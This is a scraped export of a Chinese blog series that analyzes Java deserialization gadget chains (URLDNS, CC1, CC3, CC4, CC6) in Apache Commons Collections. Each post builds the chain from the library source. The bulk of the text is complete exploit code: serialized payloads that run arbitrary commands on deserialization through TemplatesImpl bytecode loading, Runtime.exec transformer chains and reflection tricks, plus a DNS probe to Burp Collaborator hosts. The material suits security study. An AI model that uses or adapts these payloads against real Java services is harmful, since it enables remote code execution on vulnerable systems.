12345678910111213141516171819TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());// templates.newTransformer();Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers); CC3_test.class还是一样的。 剩下的先用TransformingComparator接住chainedTransformer： 1TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer); 再用PriorityQueue接住transformingComparator： 1PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator); 嗯，最后序列化和反序列化就应该好了： 123456789101112131415161718192021222324252627TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());// templates.newTransformer();Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC3.txt&quot;));oos.writeObject(priorityQueue);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC3.txt&quot;));ois.readObject(); 3.2 问题结果无事发生，肯定是中间某一部分出错了，我们就在PriorityQueue的readObject打个断点调试一下看看问题所在： 可以看到这个size为0，传入之后不会通过for循环触发接下来的方法，那我们就需要给这个数组加点元素，让它右移一位仍旧大于0，很简单，直接传两个数，让它size为2就行了： 12priorityQueue.add(1);priorityQueue.add(2); 结果发现在序列化之前就已经弹出计算器了，说明前边的代码有调用整条链子的方法。实际上这里是add方法，我们进去看一下： 可见这一套流程下来也会触发compare方法，我们不想让它本地执行也很简单，直接在给transformingComparator赋值的时候随便给一个值，之后在序列化之前给它改回chainedTransformer就好了。 3.3 完工最终完整链子如下： 123456789101112131415161718192021222324252627282930313233TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());// templates.newTransformer();Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);priorityQueue.add(1);priorityQueue.add(2);Class c = transformingComparator.getClass();Field transformerField = c.getDeclaredField(&quot;transformer&quot;);transformerField.setAccessible(true);transformerField.set(transformingComparator, chainedTransformer);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));oos.writeObject(priorityQueue);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));ois.readObject();","categories":[],"tags":[]},{"title":"JAVA安全:CC3链","slug":"JAVA安全CC3链","date":"2024-03-18T06:49:00.261Z","updated":"2024-03-19T02:55:01.427Z","comments":true,"path":"2024/03/18/JAVA安全CC3链/","link":"","permalink":"http://example.com/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/","excerpt":"作者：Narcher 时间：2024&#x2F;3&#x2F;18 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;3&#x2F;18 分类：Vulnerability Analysis 前言CC3这条链子和之前的几条链子不太一样，它更改了命令执行的方式。之前的几条链子都是反射调用Runtime.getRuntime.exec(“calc”)执行的命令，而CC3则是利用的动态类加载。简单来说，就是Java文件无法直接运行，需要编译成.class文件，再通过加载器加载到Java虚拟机的内存空间中才能运行。其核心便是ClassLoader类，其中的loadClass–&gt;findClass–&gt;defineClass三个方法的调用是必须的，最重要的是defineClass方法。 说了那么多，不如直接写一个例子看一看： 其中，CC3_test中则是： emmm……. 了解了这些之后，应该就差不多能理解整条CC3链子了，我们直接进入正文。 正文和往常一样，我们先看一下ysoserial中链子的调用流程： 可见其中对CC1的后半部分保留完整，大致是在LazyMap.get方法的触发之前的流程给改了，我们就一点点看吧。 1.TemplatesImpl部分首先我们要找重写了defineClass方法且可序列化的类，且参数可控，往上便找到了TemplatesImpl: 然后就按正常流程，一点点往上找就完了。 于是便找到了调用defineClass方法的地方： 关键代码就这么多，反正就是defineTransletClasses方法中的for循环里调用了，且_bytecodes可控。 再向上找： 找到了getTransletInstance方法，再向上找便找到了newTransformer： 看到这里，就基本上完成了，我们只需要注意一下传参，链子的大致形状就差不多确定了。 传参部分呢，我们从前往后看，正常来说看到的便只需赋值_name参数，让它不要返回null，并且_class参数不能传，因为我们要的就是defineTransletClasses方法，最关键的_bytecode必须传，因为我们要用它来作为执行代码的载体。这样编译好了之后会发现报错，调进去一看可看到问题出在调用_factory参数的地方，那么这个参数我们也要传。先看一下代码中它本身应该是什么： 是TransformerFactoryImpl类的实例，那我们就传这个。 那么这部分的链子就构造的差不多了： 1234567891011121314TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());templates.newTransformer(); 对了，这里还有一点要提醒，编译执行代码的class文件的java文件需要继承AbstractTranslet这个类，不然就会报空指针错误，继承之后还让实现一下接口，我们实现了就好了。 java文件内容差不多是这样： 12345678910111213141516171819public class CC3_test extends AbstractTranslet &#123; static &#123; try&#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125;catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125;&#125; 剩下的话，除了要注意一下要把ChainedTransformer的内容改一下，使其触发templates的newTransformer方法就好了。我们就直接把CC1链子的前半部分拿过来： 1234567891011121314151617181920212223242526272829303132333435TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());// templates.newTransformer();Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(templates), new InvokerTransformer(&quot;newTransformer&quot;,null,null),&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);//反射获取AnnotationInvocationHandler类Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class,innerMap);Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,handler);handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC3.txt&quot;));oos.writeObject(handler);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC3.txt&quot;));ois.readObject(); 看起来不错，但和ysoserial中的链子还是有差别，我们需要对其进行更改，把InvokerTransformer给用其他调用newTransformer的类替代掉，因为有的jdk版本中对InvokerTransformer做了过滤。ysoserial中用的是TrAXFilter和InstantiateTransformer。我们一个个看，先看TrAXFilter，再看InstantiateTransformer。 2.ChainedTransformer部分2.1 TrAXFilter部分 可见其构造器，我们直接传入templates对象便可调用其newTransformer方法，只是可惜TrAXFilter没有实现Serializable接口，只能用TrAXFilter配合反射来解决这个问题，于是便有了InstantiateTransformer。 2.2 InstantiateTransformer部分 关键代码就这些，我们只需要把TrAXFilter.class作为input参数传进去就好了，至于paramTypes我们可以传一个new Class[]{Templates.class}，而参数就直接传构造好的templates，把链子构造起来就是如下模样： 12345Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers); 3.构造链我们直接把ChainedTransformer部分的修改给添上去就好了： 1234567891011121314151617181920212223242526272829303132333435TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());// templates.newTransformer();Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);//反射获取AnnotationInvocationHandler类Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class,innerMap);Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,handler);handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC3.txt&quot;));oos.writeObject(handler);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC3.txt&quot;));ois.readObject(); 这样一来，CC3也便大功告成了。","categories":[],"tags":[]},{"title":"JAVA安全:CC6链","slug":"JAVA安全CC6链","date":"2024-03-17T11:28:41.733Z","updated":"2024-03-19T00:57:50.320Z","comments":true,"path":"2024/03/17/JAVA安全CC6链/","link":"","permalink":"http://example.com/2024/03/17/JAVA%E5%AE%89%E5%85%A8CC6%E9%93%BE/","excerpt":"作者：Narcher 时间：2024&#x2F;3&#x2F;17 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;3&#x2F;17 分类：Vulnerability Analysis 前言CC6这条链不受jdk版本限制，可谓非常好用。当初我接触到的第一个Java反序列化的题就是用CC6解决的，印象十分深刻。 之前我们学习了URLDNS这条链，实际上就是为了CC6做准备，因为二者有一些异曲同工之妙。 正文我们先和往常一样，去看一下ysoserial中的CC6的流程： 可以发现这条链的后半部分和我们的CC1这条链的后半部分一模一样，前边则是由AnnotationInvocationHandler的invoke方法触发get方法修改成了TiedMapEntry类中的方法来触发。我们来调试一下看看。 1.TiedMapEntry部分首先，前边一模一样，我就直接copy过来了，直接从TiedMapEntry的getValue()方法来看。 实际上它的getValue中调用了map的get方法，而map是可控的，因此我们可以直接传入构造好的LazyMap，之后我们再看一下key，其实这个key我们是完全不用管的，因为CC1的时候已经讲过，ConstantTransformer无视了调用时的传参。 之后我们再看一下谁调用了getValue方法： 实际上，还是这个类里边的hashCode方法。 2.HashMap部分看见hashCode方法，我们又刚学完URLDNS这条链，实际上就很明白了，直接上HashMap梭哈（既能调用hashCode方法，又直接重写了readObject方法，简直完美）： HashMap的readObject方法中有这么一句，调用了hash方法，而hash方法内则又调用了hashCode: 这样我们就只需要注意将key传参为我们想要利用的TiedMapEntry就好了。 3.构造链我们把上边所说的按流程串起来： 12345678910111213141516171819Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, &quot;aaa&quot;);HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();hashMap.put(tiedMapEntry, &quot;bbb&quot;);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC6.txt&quot;));oos.writeObject(hashMap);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC6.txt&quot;));ois.readObject(); 看起来不错，但完成了吗？ 实际上是没有的。我们前边学了URLDNS链可以知道，实际上在给hashMap put的时候就已经触发这条链了，这倒也没关系，只要反序列化的时候能再次触发一遍就好了，但实际上也不行，我们调试一下看看： 可以看到，根本没有进去，这其实是因为之前已经触发过一次，所以innermap中已经存在这个key了。 其实解决方法也很简单，直接在序列化之前删除掉这个key就好了。 直接： 1innerMap.remove(&quot;aaa&quot;); 。。。。。。。。。。。。。。。。。。。。。。。。。。。。 疑惑这里有一个小插曲，本人在复现的时候，并未像网上所说的在hashMap put的时候调用这条链，而是在 1TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, &quot;aaa&quot;); 这时候就已经触发这条链了。经调试，看起来像是在给key和map赋值的时候连着触发了三次（其实这也很奇怪，因为key居然没有存下来，而是在最后的时候存了下来，使得并没有在put方法中触发链子）。网上有师傅说是IDEA配置的问题，但经过测试，并非是IDEA调试导致的toString等一系列方法的触发。 这个疑惑目前还未解决，但并不妨碍之后链子的触发。 已解决，ytgg也说是IDEA的配置问题，今早打开电脑重新试了一下就成功了，怪事…… 。。。。。。。。。。。。。。。。。。。。。。。。。。。。 再进入正文，我们不想在序列化之前触发这条链，那就需要改一下前边的流程，并在序列化前用反射给改回去，其实改的方法有很多，我们可以改tiedMapEntry，也可以改innermap，还可以改chainedTransformer。我在这里改了chainedTransformer： 1234567891011121314151617181920212223Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; innerMap = LazyMap.decorate(map, new ConstantTransformer(1));TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, &quot;aaa&quot;);HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();hashMap.put(tiedMapEntry, &quot;bbb&quot;);innerMap.remove(&quot;aaa&quot;);Class c = LazyMap.class;Field factoryField = c.getDeclaredField(&quot;factory&quot;);factoryField.setAccessible(true);factoryField.set(innerMap,chainedTransformer);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC6.txt&quot;));oos.writeObject(hashMap);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC6.txt&quot;));ois.readObject(); 这样一来，CC6就大功告成了。 后文以上的CC6是白日梦组长讲的版本，和ysoserial中的CC6的差别为最终的readObject方法所属的类。上边讲的是用的HashMap的readObject，ysoserial中用的是HashSet的readObject。改起来也很简单，具体代码如下： 1234567891011121314151617181920212223Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;),&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; innerMap = LazyMap.decorate(map, new ConstantTransformer(1));TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, &quot;aaa&quot;);LinkedHashSet set = new LinkedHashSet();set.add(tiedMapEntry);innerMap.remove(&quot;aaa&quot;);Class c = LazyMap.class;Field factoryField = c.getDeclaredField(&quot;factory&quot;);factoryField.setAccessible(true);factoryField.set(innerMap,chainedTransformer);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC6.txt&quot;));oos.writeObject(set);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC6.txt&quot;));ois.readObject();","categories":[],"tags":[]},{"title":"JAVA安全:URLDNS链","slug":"JAVA安全URLDNS链","date":"2024-03-16T11:29:12.456Z","updated":"2024-03-16T12:06:31.739Z","comments":true,"path":"2024/03/16/JAVA安全URLDNS链/","link":"","permalink":"http://example.com/2024/03/16/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/","excerpt":"作者：Narcher 时间：2024&#x2F;3&#x2F;16 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;3&#x2F;16 分类：Vulnerability Analysis 前言URLDNS链是ysoserial中的一条非常经典的链，由于其与jdk版本无关，使用的均为java内置类，常常被用于检测目标是否存在反序列化漏洞，这条链本身是没有什么危害的，仅能发起DNS请求。 正文我们先去ysoserial中看一下这条链的完整流程： 可以看见这条链的流程非常简单，我们就倒着来分析一遍。 1.URL.hashCode()部分为什么要利用URL.hashCode()呢？我们进去看一下： 1234567public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode;&#125; 可以发现它的hashCode()方法里边调用了URLStreamHandler的hashCode()方法，而URLStreamHandler的hashCode()方法则如下图所示： 可见其将URL传入后调用了getHostAddress()方法，而getHostAddress()方法则会发送DNS请求去查询URL的主机名，如下图所示： 既然如此，我们从终点往上回溯，去看看HashMap如何调用的hashCode()方法。 2.HashMap.hash()部分它这个HashMap很有意思，里边呢接收两个随意的值，一个当KEY，一个当VALUE。我们要找HashMap里调用hashCode()方法的地方，如下： 之后我们再往上找利用HashMap中hash()方法的地方。 3.HashMap.putVal()部分我们可以看到HashMap自身的put()方法中有putVal()方法对hash()方法进行了调用，而该方法则是在readObject()中也有调用： 4.HashMap.readObject()部分因为我们在反序列化的时候会触发readObject()方法，而HashMap则对readObject()方法进行了重写，因此我们可以直接将HashMap进行序列化，然后反序列化触发上述URLDNS链。 5.构造链 仅按上述描述来看的话，我们就能够利用上图中的链进行触发了。但实际上，通过调试可以发现，此时触发这条链的并非反序列化，而是序列化之前的： 1hashMap.put(new URL(&quot;http://d1fq6zzx9q24dt8yandyaqt5awgm4b.burpcollaborator.net&quot;),1); 这个就很有意思了，因为put()方法会直接调用hash()方法，导致这条链正向执行一遍，那么我们在反序列化的时候是否还会触发呢？ 答案是NONONO~~~~ 因为从URL.hashCode()方法中我们可以看到，其私有属性hashCode仅在值为-1的时候会进行执行URLStreamHandler的hashCode()方法，而在正向触发过一次之后，hashCode已经被赋值为其他值了，不能再次触发。那么我们有什么办法使其值在运行过程中改变呢？答案是反射。 反射的引用我们想要这条链在序列化的时候不被触发，而在反序列化的时候触发。那么我们就利用反射，将其在序列化之前，也就是put的时候hashCode赋值为其他，而在序列化前赋值为-1，使其反序列化正好触发。 链子如下： 1234567891011121314HashMap&lt;URL,Integer&gt; hashMap = new HashMap&lt;URL,Integer&gt;();URL url = new URL(&quot;http://7ltkbk2jj0pgndcc33oyxbsy1p7fv4.burpcollaborator.net&quot;);Class c = url.getClass();Field hashcode = c.getDeclaredField(&quot;hashCode&quot;);hashcode.setAccessible(true);//针对私有方法必备hashcode.set(url,1);hashMap.put(url,1);hashcode.set(url,-1);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\URLDNS.txt&quot;));oos.writeObject(hashMap);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\URLDNS.txt&quot;));ois.readObject(); 之后我们便可看到正常的DNS请求了：","categories":[],"tags":[]},{"title":"JAVA安全:CC1链","slug":"JAVA安全CC1链","date":"2024-02-23T09:27:52.423Z","updated":"2024-03-17T11:12:20.475Z","comments":true,"path":"2024/02/23/JAVA安全CC1链/","link":"","permalink":"http://example.com/2024/02/23/JAVA%E5%AE%89%E5%85%A8CC1%E9%93%BE/","excerpt":"作者：Narcher 时间：2024&#x2F;2&#x2F;23 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;2&#x2F;23 分类：Vulnerability Analysis 前言开始之前，我们先了解一下正射和反射。 JAVA中，如果我们要调用起计算器，正常的命令执行为： 1Runtime.getRuntime().exec(&quot;calc&quot;); 但上边使用的是正射，是无法序列化写入文件中的，如果要存入文件，我们需要利用反射来实现： 1234Runtime r = Runtime.getRuntime();//实例化Runtime类Class c = r.getClass();//获取类原型，这里和正射不同，方法从类中获取Method m = c.getMethod(&quot;exec&quot;,String.class);//从类中获取exec方法m.invoke(r,&quot;calc&quot;);//相当于r.exec(&quot;calc&quot;) 所谓的CC链，实际上就是针对Apache Commons Collections组件的payload，其核心便是利用JAVA的反射机制来调用任意函数。 正文针对JAVA的反序列化漏洞，思路大致和php的反序列化漏洞一致，就是从终点往前找，首先确定一个调用了危险方法的类，并且继承了序列化接口，然后逐步溯源，直到找到一个重写了readObject方法的类，并且符合条件，那么就成功了。 下面我们以CC1链为例，进行分析。 1.终点–InvokerTransformer类CC1链的源头便是InvokerTransformer类，关键在于其构造器和继承了Transformer接口的transform方法，我们来看一下它的源码： 123456789101112131415161718192021222324public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args;&#125;public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125;&#125; 从构造器中可以得知其三个参数都是可以控制的，而方法transform是不是有点眼熟？没错，这就是在前言中讲到的反射。 我们尝试利用InvokerTransformer类执行之前的命令： 123456 Runtime r = Runtime.getRuntime();// Class c = r.getClass();// Method m = c.getMethod(&quot;exec&quot;,String.class);// m.invoke(r,&quot;calc&quot;);上边这三行注释的代码由下边这两行代替 InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;); invokerTransformer.transform(r); 执行上述代码，发现成功弹出计算器。 这样，终点就找到了，我们便需要进行溯源，寻找上一站。 2.溯源2.1 TransformedMap类我们向上找能够利用transform方法的类： 发现有很多，于是便一个个点开查看，最终发现LazyMap，TransformedMap和DefaultedMap存在利用点，我们先只看TransformedMap这个类。 123456789protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;//构造器 super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer;&#125;protected Object checkSetValue(Object value) &#123; return valueTransformer.transform(value);//我们只需要让valueTransformer为InvokerTransformer即可&#125; 然而，TransformerMap的checkSerValue方法以及其构造器都是protected类型的，只能在内部访问，因此我们需要找一个使其实例化的方法，紧接着便看到了TransformedMap中public属性的decorate方法： 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer);&#125; 因此我们可以利用TransformedMap类的decorate方法，让其实例化，之后再想办法触发checkSetValue方法。 2.2 Map遍历我们查找调用过checkSetValue方法的地方，发现TransformedMap的父类AbstractInputCheckedMapDecorator恰好调用了该方法，且其中的setValue方法为public类型 1234567891011121314static class MapEntry extends AbstractMapEntryDecorator &#123;//AbstractInputCheckedMapDecorator的副类MapEntry private final AbstractInputCheckedMapDecorator parent; protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123; super(entry); this.parent = parent; &#125; public Object setValue(Object value) &#123; value = parent.checkSetValue(value); return entry.setValue(value); &#125;&#125; 而MapEntry继承了AbstractMapEntryDecorator类，AbstractMapEntryDecorator类中继承了Map.Entry接口，可进行Map遍历 因此我们通过Map遍历时即可调用TransformedMap的父类AbstractInputCheckedMapDecorator中的setValue方法来触发TransformedMap中的checkSetValue方法。 12345678Runtime r = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;key&quot;,&quot;value&quot;);Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,null,invokerTransformer);for(Map.Entry entry:transformedmap.entrySet())&#123; entry.setValue(r);//相当于InvokerTransformer.transform(r)&#125; 